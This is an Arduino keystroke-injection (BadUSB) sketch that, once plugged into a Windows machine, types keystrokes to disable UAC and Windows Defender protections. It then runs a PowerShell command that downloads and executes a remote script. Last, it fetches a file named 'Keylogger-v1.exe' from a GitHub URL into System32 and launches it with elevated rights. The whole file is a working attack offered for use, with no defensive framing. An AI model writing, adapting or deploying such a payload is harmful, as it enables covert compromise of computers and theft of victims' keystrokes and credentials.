#include "Keyboard.h"
void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  delay(1000);

  // disable UAC
  delay(2000);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();

  delay(200);

  Keyboard.print("UAC");

  delay(1000);

  typeKey(KEY_RETURN);

  delay(1000);

  typeKey(KEY_DOWN_ARROW);

  delay(200);

  typeKey(KEY_DOWN_ARROW);

  delay(200);

  typeKey(KEY_DOWN_ARROW);

  delay(200);

  typeKey(KEY_DOWN_ARROW);

  delay(200);

  typeKey(KEY_TAB);

  delay(200);

  typeKey(KEY_RETURN);

  delay(1000);

  typeKey(KEY_LEFT_ARROW);

  delay(200);

  typeKey(KEY_RETURN);

  delay(1000);

  // disable tamper protection
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();

  delay(200);

  Keyboard.print("defender");

  delay(1000);

  typeKey(KEY_RETURN);

  delay(200);

  typeKey(KEY_RETURN);

  delay(200);

  typeKey(KEY_TAB);

  delay(200);

  typeKey(KEY_TAB);

  delay(200);

  typeKey(KEY_TAB);

  delay(200);

  typeKey(KEY_TAB);

  delay(200);

  typeKey(KEY_RETURN);

  delay(200);

  typeKey(' ');

  delay(200);

  typeKey(KEY_TAB);

  delay(200);

  typeKey(KEY_TAB);

  delay(200);

  typeKey(KEY_TAB);

  delay(200);

  typeKey(KEY_TAB);

  delay(200);

  typeKey(' ');

  delay(200);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();

  // rick roll
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(200);

  Keyboard.print("powershell \"iex (New-Object Net.WebClient).DownloadString('https://github.com/Lightemerald/badusb-script/raw/main/rickroll.p1')\"");

  delay(500);

  typeKey(KEY_RETURN);

  delay(3000);

  // download and execute file
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(200);

  Keyboard.print("powershell \"Invoke-RestMethod -Uri 'https://github.com/Lightemerald/badusb-script/raw/main/Keylogger-v1.exe' -OutFile 'C:\\Windows\\System32\\68472.exe'; Start-Process -FilePath 'C:\\Windows\\System32\\68472.exe';\"");

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  Keyboard.end();
}

void loop() {}
